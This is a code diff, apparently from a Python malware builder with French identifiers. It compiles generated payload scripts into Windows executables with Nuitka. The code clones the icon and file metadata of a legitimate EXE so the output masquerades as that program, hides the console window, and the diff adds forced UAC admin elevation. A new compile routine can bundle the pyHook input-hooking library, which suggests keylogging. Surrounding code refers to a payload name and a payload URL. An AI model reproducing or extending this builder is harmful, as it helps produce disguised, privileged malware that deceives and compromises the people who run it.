@@ -195,7 +195,7 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
                 companyName = "Test"
                 fileDescription = "Fichier test"
             ##--windows-company-name=  --windows-file-version=  --windows-file-description=
-            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --windows-disable-console --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
+            cmd = "py -m nuitka --windows-icon-from-exe={} --windows-file-version=\"{}\" --windows-company-name=\"{}\" --windows-file-description=\"{}\" --windows-disable-console --windows-uac-admin --onefile {}".format(path_exe, fileVersionNumber, companyName, fileDescription, self.pathDirOutput + name_exe_no_ext + ".pyw")
             os.system(cmd)
             shutil.copyfile(name_exe_no_ext + ".exe", self.pathDirOutput + name_exe_no_ext + ".exe")
             if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
@@ -300,6 +300,38 @@ import inspect""")
             fileDescription = metadata["EXE:FileDescription"]
             print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
             return fileVersionNumber, companyName, fileDescription
+    
+    def Compiler(self, path_fichier, output, adm=False, pyhook=True, icon=""):
+        """Compile un Fichier python avec Nuitka"""
+        name_fichier = os.path.basename(path_fichier)
+        name_fichier_no_ext, ext  = os.path.splitext(name_fichier)
+        ## Complier le loader
+        cmd = "py -m nuitka --follow-imports --windows-disable-console --onefile "
+        if pyhook:
+            cmd = cmd + " --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\"".format(self.appdata)
+        if adm:
+            cmd = cmd + " --windows-uac-admin"
+        
+        #if not icon == "":
+            #cmd = cmd + " --windows-uac-admin"
+        
+        cmd = cmd + " {}".format(path_fichier)
+        os.system(cmd)
+        print("Compilation terminer")
+        shutil.copyfile(name_fichier, output)
+
+        if os.path.exists(name_fichier_no_ext + ".exe"):
+            os.remove(name_fichier_no_ext + ".exe")
+
+        shutil.rmtree(name_fichier_no_ext + ".dist/")
+        shutil.rmtree(name_fichier_no_ext + ".build/")
+        shutil.rmtree(name_fichier_no_ext + ".onefile-build/")
+    
+    def EcrireFichier(self, list_code, name_fichier):
+        fichier = open(name_fichier, "w")
+        for code in list_code:
+            fichier.write(code)
+        fichier.close()
 
 if args.freeze == False and args.path_exe == "" and args.adm == True:
     print("Options incompatible")
